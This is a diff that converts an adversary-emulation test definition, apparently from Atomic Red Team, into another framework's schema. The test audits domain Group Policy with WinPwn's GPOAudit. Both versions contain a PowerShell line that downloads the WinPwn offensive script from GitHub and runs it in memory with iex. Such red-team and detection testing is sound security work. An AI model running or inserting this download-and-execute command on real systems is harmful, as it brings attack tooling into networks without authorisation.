@@ -1,13 +1,15 @@
-- id: 656eec41-f249-54a2-aac1-f8c4c38e1877
+- requirements: []
   name: Soumaia ART Tests - WinPwn - GPOAudit
   description: Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn
   tactic: discovery
-  technique:
-    attack_id: T1615
-    name: Group Policy Discovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-          GPOAudit -noninteractive -consoleoutput
+  technique_id: T1615
+  technique_name: Group Policy Discovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPOAudit -noninteractive -consoleoutput
+  id: 656eec41-f249-54a2-aac1-f8c4c38e1877
